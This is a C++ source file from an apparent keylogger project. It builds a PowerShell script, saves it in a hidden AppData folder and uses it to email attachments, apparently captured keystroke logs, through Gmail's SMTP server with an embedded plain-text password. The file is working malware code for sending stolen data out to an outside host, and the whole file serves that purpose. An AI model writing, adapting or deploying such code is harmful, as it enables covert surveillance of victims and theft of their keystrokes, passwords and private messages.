#include "PowerShellSendMailScriptCreator.h"
#include "KeyloggerDirectoryLocator.h"

#include "exceptions/FileNotFound.h"

namespace keylogger::mail
{
PowerShellSendMailScriptCreator::PowerShellSendMailScriptCreator(
    std::shared_ptr<FileSystemAccess> fileSystemAccessInit)
    : fileSystem{std::move(fileSystemAccessInit)}, scriptName{"sendMail.ps1"}
{
}

bool PowerShellSendMailScriptCreator::createScript(const Mail& mail, const Credentials& credentials)
{
    const std::string scriptDirectory = KeyloggerDirectoryLocator::getAppDataKeyloggerPath(true);
    scriptAbsoluteFilePath = scriptDirectory + scriptName;
    const auto scriptBody = constructFormattedScriptBody(mail, credentials);

    try
    {
        fileSystem->createDirectory(scriptDirectory);
        fileSystem->tryToWrite(scriptAbsoluteFilePath, scriptBody);
    }
    catch (const exceptions::FileNotFound&)
    {
        return false;
    }
    return true;
}

std::string PowerShellSendMailScriptCreator::getScriptFilePath() const
{
    return scriptAbsoluteFilePath;
}

std::string PowerShellSendMailScriptCreator::constructFormattedScriptBody(const Mail& mail, const Credentials& credentials)
{
    return "Param( #parameters to our script\r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
    "[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
    " {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
    "[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
    "[String]$From,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        "
    "[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
    "[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
    "[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
    "[String]$attachment\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
    "System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
    "\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
    "                        $Attachments = $attachment -split (\"\\:\\:\");\r\n                      "
    "  ForEach ($val in $Attachments)\r\n                    "
    "        {\r\n               "
    "                 $attch = New-Object System.Net.Mail.Attachment($val)\r\n                       "
    "         $Msg.Attachments.Add($attch)\r\n                            }\r\n                    "
    "}\r\n                catch\r\n                    {\r\n                        exit 2; "
    "#attachment not found, or.. dont have permission\r\n                    }\r\n            }\r\n "
    "           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
    "           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
    "System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $Client.Send($Msg)\r\n "
    "           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
    "exit 7; #everything went OK\r\n          }\r\n      catch\r\n          {\r\n            exit 3; #error,"
    " something went wrong :(\r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
    "Send-EMail -attachment $Att "
    "-To \"" +
    std::string(mail.emailTargetAddress) +
    "\""
    " -Body $Body -Subject $Subj "
    "-password \"" +
    std::string(credentials.password) +
    "\""
    " -From \"" +
    std::string(mail.emailSourceAddress) +
    "\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; #well, calling the function is wrong? not enough parameters\r\n    }";
}

}